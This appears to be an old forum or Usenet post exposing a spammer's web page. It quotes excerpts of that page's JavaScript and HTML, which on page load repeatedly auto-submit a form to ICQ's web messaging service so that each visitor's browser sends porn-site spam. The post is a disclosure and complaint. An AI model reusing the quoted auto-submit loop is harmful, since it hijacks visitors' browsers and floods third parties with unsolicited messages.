I've dug around the html (manually reconstructed some of the oddball URLs)
on this guy's site... here's a page that's undoubtably causing people some
trouble...
  // About the email being sent...
  sentFrom= "Sex Hacker"; //your name
  fromEmail="dude6hg56j@aol.com"; //your email
  theSubject= "Hacked XXX Sites!!"; //subject line
...
  document.forms[0].to.value=UIN
  document.forms[0].fromemail.value=fromEmail
  document.forms[0].from.value=sentFrom
  document.forms[0].subject.value=theSubject
  //document.forms[0].body.value=theMsg
  document.stats.number.value=submitCount
  document.forms[0].Send.click()
...
  <body onLoad=document.stats.sendLoop.click()>
...
  <form action=
http://wwp.icq.com/scripts/WWPMsg.dll
 method=post target=output>
  <input type=text name=from value=EliteHacker size=30 maxlength=40><br>
  <input type=text name=fromemail value="me@mybest.com" size=30 maxlength=40><br>
  <input type=text name=subject value=HackedSexSites size=30 maxlength=30><br>
  <textarea name=body rows=10 cols=55 wrap=Virtual>
  ACCESS about 100 XXX sites for free! Hacked by elite hackers! No banners, no
  credit cards, no membership and no bullshit, go to
  
http://SEX.InteractWithMe.com
 you get direct membership access to the best
  sex sites in the world NO CATCH. Go NOW to

  </textarea><br>
  <input type=text name=to value= size=30 maxlength=20><br>
  <input type=SUBMIT name=Send value=SendOnlyOneMessage>&nbsp;&nbsp;
  </form>
  <form name=stats>
  <input type=button name=stop value=stop onClick=clearInterval(vcRunnerTimer);>
  <input type=button name=sendLoop value=SendLoop onClick=vcRunnerTimer=setInterval('sender()',1000);>
  attempted... <input type=text name=number size=7>
... does the area in 'textarea' look familiar? This particular page 'forces'
passers by to spam ICQ numbers (hence the UIN and the action pointing at
wwq.icq.com). I don't doubt that this guy has cobbled together a few
different pages and he cycles through 'em randomly, so that each visitor
spams out a new message, some via email, some via ICQ, etc. 
This guy needs a lawyer to slap his pee-pee, hard. FWIW, he seems to be
getting his service from ixcis.net.
